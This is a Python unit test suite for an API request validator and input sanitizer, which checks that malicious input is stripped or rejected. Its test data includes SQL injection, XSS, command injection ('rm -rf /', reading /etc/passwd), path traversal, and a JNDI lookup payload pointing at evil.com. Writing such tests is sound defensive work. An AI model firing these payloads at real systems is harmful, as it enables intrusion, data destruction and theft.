"""
Comprehensive test suite for RequestValidator and InputSanitizer
Tests all methods, edge cases, error handling, security features, and performance
"""

import unittest
import json
import html
import time
from unittest.mock import patch, MagicMock
import threading
import sys
import os
import re

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from production_api.request_validator import RequestValidator, InputSanitizer


class TestInputSanitizer(unittest.TestCase):
    """Test suite for InputSanitizer"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.config = {
            'max_string_length': 1000,
            'max_array_size': 100,
            'max_object_depth': 5,
            'allow_html': False,
            'allow_sql': False
        }
        self.sanitizer = InputSanitizer(self.config)
        
    def test_initialization(self):
        """Test sanitizer initialization"""
        sanitizer = InputSanitizer(self.config)
        self.assertEqual(sanitizer.max_string_length, 1000)
        self.assertEqual(sanitizer.max_array_size, 100)
        self.assertEqual(sanitizer.max_object_depth, 5)
        self.assertFalse(sanitizer.allow_html)
        self.assertFalse(sanitizer.allow_sql)
        self.assertIsNotNone(sanitizer.dangerous_patterns)
        
    def test_initialization_with_defaults(self):
        """Test sanitizer initialization with default values"""
        sanitizer = InputSanitizer({})
        self.assertEqual(sanitizer.max_string_length, 10000)
        self.assertEqual(sanitizer.max_array_size, 1000)
        self.assertEqual(sanitizer.max_object_depth, 10)
        
    def test_sanitize_string_basic(self):
        """Test basic string sanitization"""
        # Normal string
        result = self.sanitizer._sanitize_string("hello world", "test")
        self.assertEqual(result, "hello world")
        
        # Empty string
        result = self.sanitizer._sanitize_string("", "test")
        self.assertEqual(result, "")
        
    def test_sanitize_string_length_limit(self):
        """Test string length limiting"""
        long_string = "a" * 2000
        result = self.sanitizer._sanitize_string(long_string, "test")
        self.assertEqual(len(result), 1000)
        self.assertEqual(result, "a" * 1000)
        
    def test_sanitize_string_null_bytes(self):
        """Test null byte removal"""
        string_with_null = "hello\x00world"
        result = self.sanitizer._sanitize_string(string_with_null, "test")
        self.assertEqual(result, "helloworld")
        
    def test_sanitize_string_html_escape(self):
        """Test HTML escaping"""
        html_string = '<script>alert("xss")</script>'
        result = self.sanitizer._sanitize_string(html_string, "test")
        self.assertNotIn('<script>', result)
        self.assertIn('&lt;', result)
        
        # Test with allow_html=True
        sanitizer = InputSanitizer({'allow_html': True})
        result = sanitizer._sanitize_string(html_string, "test")
        # Even with allow_html, dangerous patterns should be removed
        self.assertNotIn('<script', result)
        
    def test_sanitize_string_sql_injection(self):
        """Test SQL injection pattern removal"""
        sql_strings = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin' UNION SELECT * FROM passwords --",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for sql in sql_strings:
            result = self.sanitizer._sanitize_string(sql, "test")
            # Check that dangerous SQL patterns are removed
            self.assertNotIn('DROP TABLE', result.upper())
            self.assertNotIn('UNION SELECT', result.upper())
            self.assertNotIn('EXEC', result.upper())
            
    def test_sanitize_string_xss_patterns(self):
        """Test XSS pattern removal"""
        xss_strings = [
            '<script>alert(1)</script>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            '<iframe src="evil.com"></iframe>',
            '<object data="evil.swf"></object>',
            '<embed src="evil.swf">'
        ]
        
        for xss in xss_strings:
            result = self.sanitizer._sanitize_string(xss, "test")
            self.assertNotIn('javascript:', result)
            self.assertNotIn('onerror=', result)
            self.assertNotIn('<iframe', result)
            self.assertNotIn('<object', result)
            self.assertNotIn('<embed', result)
            
    def test_sanitize_string_command_injection(self):
        """Test command injection pattern removal"""
        cmd_strings = [
            'test; rm -rf /',
            'test | cat /etc/passwd',
            'test && shutdown -h now',
            'test `whoami`',
            'test $(ls -la)'
        ]
        
        for cmd in cmd_strings:
            result = self.sanitizer._sanitize_string(cmd, "test")
            self.assertNotIn('rm ', result)
            self.assertNotIn('shutdown', result)
            self.assertNotIn('`', result)
            self.assertNotIn('$(', result)
            
    def test_sanitize_string_path_traversal(self):
        """Test path traversal pattern removal"""
        path_strings = [
            '../../etc/passwd',
            '..\\windows\\system32',
            '%2e%2e%2f%2e%2e%2f',
            '..%2f..%2f'
        ]
        
        for path in path_strings:
            result = self.sanitizer._sanitize_string(path, "test")
            self.assertNotIn('../', result)
            self.assertNotIn('..\\', result)
            self.assertNotIn('%2e%2e', result.lower())
            
    def test_sanitize_string_url_decode(self):
        """Test URL decoding and re-sanitization"""
        # URL encoded XSS
        encoded_xss = '%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
        result = self.sanitizer._sanitize_string(encoded_xss, "test")
        self.assertNotIn('<script>', result)
        self.assertNotIn('alert', result)
        
    def test_sanitize_number(self):
        """Test number sanitization"""
        # Normal numbers
        self.assertEqual(self.sanitizer._sanitize_number(42, "test"), 42)
        self.assertEqual(self.sanitizer._sanitize_number(3.14, "test"), 3.14)
        self.assertEqual(self.sanitizer._sanitize_number(-100, "test"), -100)
        
        # NaN
        result = self.sanitizer._sanitize_number(float('nan'), "test")
        self.assertEqual(result, 0)
        
        # Infinity
        result = self.sanitizer._sanitize_number(float('inf'), "test")
        self.assertEqual(result, 999999999)
        
        result = self.sanitizer._sanitize_number(float('-inf'), "test")
        self.assertEqual(result, -999999999)
        
        # Very large numbers
        result = self.sanitizer._sanitize_number(1e20, "test")
        self.assertEqual(result, 1e15)
        
        result = self.sanitizer._sanitize_number(-1e20, "test")
        self.assertEqual(result, -1e15)
        
    def test_sanitize_array(self):
        """Test array sanitization"""
        # Normal array
        arr = [1, 2, 3, "test", True]
        result, errors = self.sanitizer._sanitize_array(arr, "test")
        self.assertEqual(result, [1, 2, 3, "test", True])
        self.assertEqual(errors, [])
        
        # Array with dangerous strings
        arr = ["normal", "<script>alert(1)</script>", "'; DROP TABLE users;"]
        result, errors = self.sanitizer._sanitize_array(arr, "test")
        self.assertNotIn('<script>', str(result))
        self.assertNotIn('DROP TABLE', str(result).upper())
        
        # Array size limit
        large_arr = list(range(200))
        result, errors = self.sanitizer._sanitize_array(large_arr, "test")
        self.assertEqual(len(result), 100)
        self.assertIn('Array size exceeded', errors[0])
        
        # Nested arrays
        nested = [1, [2, [3, [4, [5]]]]]
        result, errors = self.sanitizer._sanitize_array(nested, "test")
        self.assertIsInstance(result[1], list)
        
    def test_sanitize_object(self):
        """Test object/dictionary sanitization"""
        # Normal object
        obj = {"name": "test", "age": 30, "active": True}
        result, errors = self.sanitizer._sanitize_object(obj, "test", 0)
        self.assertEqual(result, {"name": "test", "age": 30, "active": True})
        self.assertEqual(errors, [])
        
        # Object with dangerous values
        obj = {
            "safe": "hello",
            "xss": "<script>alert(1)</script>",
            "sql": "'; DROP TABLE users;"
        }
        result, errors = self.sanitizer._sanitize_object(obj, "test", 0)
        self.assertNotIn('<script>', str(result))
        self.assertNotIn('DROP TABLE', str(result).upper())
        
        # Nested object depth limit
        nested = {"level1": {"level2": {"level3": {"level4": {"level5": {"level6": "too deep"}}}}}}
        result, errors = self.sanitizer._sanitize_object(nested, "test", 0)
        # Should stop at max depth
        self.assertTrue(any('depth exceeded' in e.lower() for e in errors))
        
    def test_sanitize_value(self):
        """Test generic value sanitization"""
        # String
        result, errors = self.sanitizer._sanitize_value("test", "path")
        self.assertEqual(result, "test")
        self.assertEqual(errors, [])
        
        # Number
        result, errors = self.sanitizer._sanitize_value(42, "path")
        self.assertEqual(result, 42)
        
        # Boolean
        result, errors = self.sanitizer._sanitize_value(True, "path")
        self.assertEqual(result, True)
        
        # None
        result, errors = self.sanitizer._sanitize_value(None, "path")
        self.assertIsNone(result)
        
        # Unknown type
        class CustomClass:
            pass
        result, errors = self.sanitizer._sanitize_value(CustomClass(), "path")
        self.assertIn('Unknown value type', errors[0])
        
    def test_sanitize_parameters(self):
        """Test parameter sanitization"""
        params = {
            "name": "John Doe",
            "age": "30",
            "search": "'; DROP TABLE users;",
            "script": "<script>alert(1)</script>"
        }
        
        result = self.sanitizer.sanitize_parameters(params)
        
        # Check dangerous content is sanitized
        self.assertNotIn('DROP TABLE', str(result).upper())
        self.assertNotIn('<script>', str(result))
        
        # Check normal values are preserved
        self.assertIn('John Doe', str(result))
        
    def test_sanitize_body(self):
        """Test body sanitization"""
        body = {
            "user": {
                "name": "Alice",
                "bio": "<script>alert('xss')</script>",
                "tags": ["tag1", "tag2", "'; DELETE FROM tags;"]
            }
        }
        
        result = self.sanitizer.sanitize_body(body)
        
        # Check dangerous content is sanitized
        self.assertNotIn('<script>', str(result))
        self.assertNotIn('DELETE FROM', str(result).upper())
        
        # Check structure is preserved
        self.assertIn('user', result)
        self.assertIn('name', result['user'])
        
    def test_sanitizer_error_handling(self):
        """Test error handling in sanitizer"""
        # Test with circular reference (should handle gracefully)
        circular = {}
        circular['self'] = circular
        
        # This might cause recursion issues
        try:
            result = self.sanitizer.sanitize_body(circular)
            # Should either handle it or report error
            if 'errors' in result:
                self.assertTrue(len(result['errors']) > 0)
        except RecursionError:
            # Expected for circular references
            pass


class TestRequestValidator(unittest.TestCase):
    """Test suite for RequestValidator"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.config = {
            'max_body_size': 1024 * 1024,  # 1MB
            'max_header_size': 8192,
            'max_url_length': 2048,
            'allowed_content_types': [
                'application/json',
                'application/x-www-form-urlencoded'
            ],
            'sanitization': {
                'max_string_length': 1000,
                'allow_html': False,
                'allow_sql': False
            }
        }
        self.validator = RequestValidator(self.config)
        
        # Sample valid request
        self.valid_request = {
            'endpoint': '/brain/predict',
            'method': 'POST',
            'headers': {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer token123'
            },
            'parameters': {
                'version': '1.0'
            },
            'body': {
                'input_data': [1, 2, 3],
                'model_id': 'model_001'
            }
        }
        
    def test_initialization(self):
        """Test validator initialization"""
        validator = RequestValidator(self.config)
        self.assertEqual(validator.max_body_size, 1024 * 1024)
        self.assertEqual(validator.max_header_size, 8192)
        self.assertEqual(validator.max_url_length, 2048)
        self.assertIsNotNone(validator.sanitizer)
        self.assertIsNotNone(validator.validation_rules)
        
    def test_initialization_with_defaults(self):
        """Test validator initialization with defaults"""
        validator = RequestValidator({})
        self.assertEqual(validator.max_body_size, 10 * 1024 * 1024)
        self.assertEqual(len(validator.allowed_content_types), 4)
        
    def test_validate_request_format_valid(self):
        """Test validation of valid request format"""
        result = self.validator.validate_request_format(self.valid_request)
        
        self.assertTrue(result['valid'])
        self.assertEqual(result['errors'], [])
        
    def test_validate_request_format_missing_fields(self):
        """Test validation with missing required fields"""
        # Missing endpoint
        request = {'method': 'POST'}
        result = self.validator.validate_request_format(request)
        self.assertFalse(result['valid'])
        self.assertIn('Missing required field: endpoint', result['errors'])
        
        # Missing method
        request = {'endpoint': '/test'}
        result = self.validator.validate_request_format(request)
        self.assertFalse(result['valid'])
        self.assertIn('Missing required field: method', result['errors'])
        
    def test_validate_endpoint(self):
        """Test endpoint validation"""
        # Valid endpoints
        valid_endpoints = [
            '/api/test',
            '/brain/predict',
            '/users/123',
            '/data-analysis/run'
        ]
        
        for endpoint in valid_endpoints:
            errors = self.validator._validate_endpoint(endpoint)
            self.assertEqual(errors, [], f"Failed for {endpoint}")
            
        # Invalid endpoints
        invalid_cases = [
            ('api/test', 'Endpoint must start with /'),
            ('/api/../etc/passwd', 'Path traversal detected'),
            ('/api//test', 'Double slashes not allowed'),
            ('/api/<script>', 'invalid characters'),
            ('/' + 'a' * 3000, 'Endpoint too long')
        ]
        
        for endpoint, expected_error in invalid_cases:
            errors = self.validator._validate_endpoint(endpoint)
            self.assertTrue(len(errors) > 0, f"Should fail for {endpoint}")
            self.assertTrue(any(expected_error in e for e in errors))
            
    def test_validate_method(self):
        """Test HTTP method validation"""
        # Valid methods
        valid_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        for method in valid_methods:
            errors = self.validator._validate_method(method)
            self.assertEqual(errors, [])
            
        # Invalid methods
        invalid_methods = ['TRACE', 'CONNECT', 'FOO', 'get', 'Post']
        for method in invalid_methods:
            errors = self.validator._validate_method(method)
            self.assertTrue(len(errors) > 0)
            self.assertIn('Invalid HTTP method', errors[0])
            
    def test_validate_headers(self):
        """Test header validation"""
        # Valid headers
        valid_headers = {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer token',
            'X-Custom-Header': 'value'
        }
        errors = self.validator._validate_headers(valid_headers)
        self.assertEqual(errors, [])
        
        # Invalid header type
        errors = self.validator._validate_headers("not a dict")
        self.assertIn('Headers must be a dictionary', errors)
        
        # Invalid header names
        invalid_headers = {
            'Invalid Header': 'value',  # Space in name
            'Header\nName': 'value',    # Newline in name
            123: 'value'                 # Non-string name
        }
        errors = self.validator._validate_headers(invalid_headers)
        self.assertTrue(len(errors) > 0)
        
        # Invalid header values
        invalid_headers = {
            'Header1': 'value\nwith\nnewlines',
            'Header2': 'x' * 5000,  # Too long
            'Header3': 123  # Non-string value
        }
        errors = self.validator._validate_headers(invalid_headers)
        self.assertTrue(len(errors) > 0)
        
        # Headers too large
        large_headers = {f'Header{i}': 'x' * 100 for i in range(100)}
        errors = self.validator._validate_headers(large_headers)
        self.assertTrue(any('too large' in e for e in errors))
        
    def test_validate_parameters(self):
        """Test parameter validation"""
        # Valid parameters
        valid_params = {
            'page': 1,
            'limit': 10,
            'search': 'test query',
            'active': True,
            'tags': ['tag1', 'tag2']
        }
        errors = self.validator._validate_parameters(valid_params)
        self.assertEqual(errors, [])
        
        # Invalid parameter type
        errors = self.validator._validate_parameters("not a dict")
        self.assertIn('Parameters must be a dictionary', errors)
        
        # Invalid parameter names
        invalid_params = {
            'param name': 'value',  # Space
            'param;name': 'value',  # Semicolon
            123: 'value'            # Non-string
        }
        errors = self.validator._validate_parameters(invalid_params)
        self.assertTrue(len(errors) > 0)
        
        # Invalid parameter value types
        class CustomClass:
            pass
            
        invalid_params = {
            'object': CustomClass(),
            'dict': {'nested': 'dict'}
        }
        errors = self.validator._validate_parameters(invalid_params)
        self.assertTrue(any('Invalid parameter type' in e for e in errors))
        
    def test_validate_body(self):
        """Test body validation"""
        headers = {'Content-Type': 'application/json'}
        
        # Valid body
        valid_body = {'key': 'value', 'number': 123}
        errors = self.validator._validate_body(valid_body, headers)
        self.assertEqual(errors, [])
        
        # Invalid body type
        errors = self.validator._validate_body(123, headers)
        self.assertIn('Body must be a dictionary, list, or string', errors)
        
        # Body too large
        large_body = {'data': 'x' * (2 * 1024 * 1024)}  # 2MB
        errors = self.validator._validate_body(large_body, headers)
        self.assertTrue(any('Body too large' in e for e in errors))
        
        # Invalid content type
        headers = {'Content-Type': 'application/xml'}
        errors = self.validator._validate_body(valid_body, headers)
        self.assertTrue(any('Content type not allowed' in e for e in errors))
        
        # Invalid JSON string
        headers = {'Content-Type': 'application/json'}
        invalid_json = '{invalid json}'
        errors = self.validator._validate_body(invalid_json, headers)
        self.assertTrue(any('Invalid JSON' in e for e in errors))
        
    def test_validate_against_rules(self):
        """Test validation against endpoint-specific rules"""
        # Test /brain/predict endpoint
        request = {
            'endpoint': '/brain/predict',
            'method': 'POST',
            'body': {
                'input_data': [1, 2, 3],
                'model_id': 'model_001',
                'confidence_threshold': 0.8
            }
        }
        errors = self.validator._validate_against_rules(request)
        self.assertEqual(errors, [])
        
        # Missing required field
        request['body'] = {'model_id': 'model_001'}
        errors = self.validator._validate_against_rules(request)
        self.assertIn('Missing required field: input_data', errors)
        
        # Wrong field type
        request['body'] = {
            'input_data': 'not a list or dict',
            'model_id': 123  # Should be string
        }
        errors = self.validator._validate_against_rules(request)
        self.assertTrue(any('Invalid type' in e for e in errors))
        
        # Constraint violation
        request['body'] = {
            'input_data': [1, 2, 3],
            'confidence_threshold': 1.5  # Should be between 0 and 1
        }
        errors = self.validator._validate_against_rules(request)
        self.assertTrue(any('Constraint failed' in e for e in errors))
        
        # Invalid allowed value
        request = {
            'endpoint': '/training/start',
            'body': {
                'dataset_id': 'dataset_001',
                'model_type': 'invalid_type'
            }
        }
        errors = self.validator._validate_against_rules(request)
        self.assertTrue(any('not in' in e for e in errors))
        
    def test_validate_request_content(self):
        """Test full request content validation"""
        request = {
            'endpoint': '/brain/predict',
            'method': 'POST',
            'parameters': {
                'version': '1.0',
                'dangerous': "'; DROP TABLE users;"
            },
            'body': {
                'input_data': [1, 2, 3],
                'xss': '<script>alert(1)</script>'
            }
        }
        
        result = self.validator.validate_request_content(request)
        
        # Should be valid after sanitization
        self.assertTrue(result['valid'] or len(result['errors']) > 0)
        
        # Check sanitization occurred
        sanitized = result['sanitized_request']
        self.assertNotIn('DROP TABLE', str(sanitized).upper())
        self.assertNotIn('<script>', str(sanitized))
        
    def test_metrics_tracking(self):
        """Test validation metrics tracking"""
        # Reset metrics
        self.validator.validation_metrics = {
            'total_validations': 0,
            'passed_validations': 0,
            'failed_validations': 0,
            'sanitizations_performed': 0
        }
        
        # Valid request
        self.validator.validate_request_format(self.valid_request)
        metrics = self.validator.get_validation_metrics()
        self.assertEqual(metrics['total_validations'], 1)
        self.assertEqual(metrics['passed_validations'], 1)
        
        # Invalid request
        invalid_request = {'endpoint': 'invalid'}
        self.validator.validate_request_format(invalid_request)
        metrics = self.validator.get_validation_metrics()
        self.assertEqual(metrics['total_validations'], 2)
        self.assertEqual(metrics['failed_validations'], 1)
        
        # Check success rate
        self.assertEqual(metrics['success_rate'], 0.5)
        
    def test_edge_case_empty_request(self):
        """Test validation of empty request"""
        result = self.validator.validate_request_format({})
        self.assertFalse(result['valid'])
        self.assertTrue(len(result['errors']) >= 2)  # Missing endpoint and method
        
    def test_edge_case_none_values(self):
        """Test handling of None values"""
        request = {
            'endpoint': '/test',
            'method': 'POST',
            'headers': None,
            'body': None,
            'parameters': None
        }
        
        # Should handle None values gracefully
        result = self.validator.validate_request_format(request)
        # May have errors but shouldn't crash
        self.assertIn('valid', result)
        self.assertIn('errors', result)
        
    def test_edge_case_special_characters(self):
        """Test handling of special characters"""
        request = {
            'endpoint': '/test',
            'method': 'POST',
            'body': {
                'unicode': '你好世界 🌍',
                'special': '!@#$%^&*()_+{}[]|\\:";\'<>?,./`~',
                'newlines': 'line1\nline2\rline3',
                'tabs': 'tab1\ttab2'
            }
        }
        
        result = self.validator.validate_request_format(request)
        # Should handle special characters
        self.assertIn('valid', result)
        
    def test_error_handling_exceptions(self):
        """Test error handling for exceptions"""
        # Force an exception by passing invalid data type
        with patch.object(self.validator, '_validate_endpoint', side_effect=Exception('Test error')):
            result = self.validator.validate_request_format(self.valid_request)
            self.assertFalse(result['valid'])
            self.assertTrue(any('Validation error' in e for e in result['errors']))
            
    def test_thread_safety(self):
        """Test thread safety of validator"""
        results = []
        errors = []
        
        def validate_worker(validator, request, index):
            try:
                result = validator.validate_request_format(request)
                results.append((index, result['valid']))
            except Exception as e:
                errors.append((index, str(e)))
                
        threads = []
        for i in range(10):
            request = self.valid_request.copy()
            request['parameters'] = {'thread_id': i}
            t = threading.Thread(
                target=validate_worker, 
                args=(self.validator, request, i)
            )
            threads.append(t)
            t.start()
            
        for t in threads:
            t.join()
            
        # All should complete without errors
        self.assertEqual(len(errors), 0)
        self.assertEqual(len(results), 10)
        
    def test_performance_large_request(self):
        """Test performance with large requests"""
        # Create a large but valid request
        large_request = {
            'endpoint': '/test',
            'method': 'POST',
            'headers': {f'Header{i}': f'value{i}' for i in range(50)},
            'parameters': {f'param{i}': i for i in range(50)},
            'body': {
                'data': [{'id': i, 'value': f'item{i}'} for i in range(100)]
            }
        }
        
        start_time = time.time()
        result = self.validator.validate_request_format(large_request)
        elapsed = time.time() - start_time
        
        # Should complete in reasonable time (< 1 second)
        self.assertLess(elapsed, 1.0)
        self.assertIn('valid', result)
        
    def test_custom_validation_rules(self):
        """Test custom validation rules for endpoints"""
        # Test constraint function
        request = {
            'endpoint': '/brain/predict',
            'body': {
                'input_data': [1, 2, 3],
                'confidence_threshold': 0.5
            }
        }
        errors = self.validator._validate_against_rules(request)
        self.assertEqual(errors, [])
        
        # Test constraint failure
        request['body']['confidence_threshold'] = -0.1
        errors = self.validator._validate_against_rules(request)
        self.assertTrue(any('Constraint failed' in e for e in errors))
        
        request['body']['confidence_threshold'] = 1.1
        errors = self.validator._validate_against_rules(request)
        self.assertTrue(any('Constraint failed' in e for e in errors))
        
    def test_recursion_depth_limit(self):
        """Test handling of deeply nested objects"""
        # Create deeply nested structure
        nested = {'level': 1}
        current = nested
        for i in range(20):
            current['next'] = {'level': i + 2}
            current = current['next']
            
        request = {
            'endpoint': '/test',
            'method': 'POST',
            'body': nested
        }
        
        result = self.validator.validate_request_content(request)
        # Should handle deep nesting (either truncate or error)
        self.assertIn('valid', result)
        
    def test_circular_reference_handling(self):
        """Test handling of circular references"""
        # Create circular reference
        circular = {'name': 'test'}
        circular['self'] = circular
        
        request = {
            'endpoint': '/test',
            'method': 'POST',
            'body': circular
        }
        
        # Should handle circular reference without crashing
        try:
            result = self.validator.validate_request_content(request)
            self.assertIn('valid', result)
        except (RecursionError, ValueError):
            # Expected for circular references
            pass


class TestIntegration(unittest.TestCase):
    """Integration tests for RequestValidator and InputSanitizer"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.config = {
            'max_body_size': 1024 * 1024,
            'sanitization': {
                'max_string_length': 1000,
                'allow_html': False,
                'allow_sql': False
            }
        }
        self.validator = RequestValidator(self.config)
        
    def test_full_request_validation_flow(self):
        """Test complete request validation flow"""
        # Simulate a real API request
        request = {
            'endpoint': '/brain/predict',
            'method': 'POST',
            'headers': {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
            },
            'parameters': {
                'version': '2.0',
                'debug': 'true'
            },
            'body': {
                'input_data': [
                    {'feature1': 0.5, 'feature2': 1.2},
                    {'feature1': 0.7, 'feature2': 0.9}
                ],
                'model_id': 'neural_net_v3',
                'confidence_threshold': 0.85
            }
        }
        
        # Validate format
        format_result = self.validator.validate_request_format(request)
        self.assertTrue(format_result['valid'])
        
        # Validate content
        content_result = self.validator.validate_request_content(request)
        self.assertTrue(content_result['valid'])
        
        # Check sanitized request
        self.assertIn('sanitized_request', content_result)
        
    def test_malicious_request_handling(self):
        """Test handling of malicious requests"""
        malicious_request = {
            'endpoint': '/../../etc/passwd',
            'method': 'POST',
            'headers': {
                'Content-Type': 'application/json',
                'X-Evil': '<script>alert(document.cookie)</script>'
            },
            'parameters': {
                'user': "admin' OR '1'='1",
                'cmd': '; rm -rf /'
            },
            'body': {
                'input_data': [
                    "'; DROP TABLE users; --",
                    "<img src=x onerror=alert(1)>"
                ],
                'payload': '${jndi:ldap://evil.com/a}'
            }
        }
        
        # Validate format - should catch path traversal
        format_result = self.validator.validate_request_format(malicious_request)
        self.assertFalse(format_result['valid'])
        self.assertTrue(any('traversal' in e.lower() for e in format_result['errors']))
        
        # Fix endpoint for content validation test
        malicious_request['endpoint'] = '/brain/predict'
        
        # Validate content - should sanitize dangerous content
        content_result = self.validator.validate_request_content(malicious_request)
        
        if 'sanitized_request' in content_result:
            sanitized = content_result['sanitized_request']
            # Check that dangerous content is removed
            self.assertNotIn('DROP TABLE', str(sanitized).upper())
            self.assertNotIn('<script>', str(sanitized))
            self.assertNotIn('rm -rf', str(sanitized))
            
    def test_performance_under_load(self):
        """Test performance under heavy load"""
        requests = []
        for i in range(100):
            request = {
                'endpoint': f'/api/endpoint{i % 10}',
                'method': 'POST',
                'headers': {'Content-Type': 'application/json'},
                'body': {
                    'data': f'test_data_{i}',
                    'index': i
                }
            }
            requests.append(request)
            
        start_time = time.time()
        
        for request in requests:
            self.validator.validate_request_format(request)
            self.validator.validate_request_content(request)
            
        elapsed = time.time() - start_time
        
        # Should process 100 requests in reasonable time
        self.assertLess(elapsed, 5.0)
        
        # Check metrics
        metrics = self.validator.get_validation_metrics()
        self.assertGreaterEqual(metrics['total_validations'], 100)


if __name__ == '__main__':
    unittest.main(verbosity=2)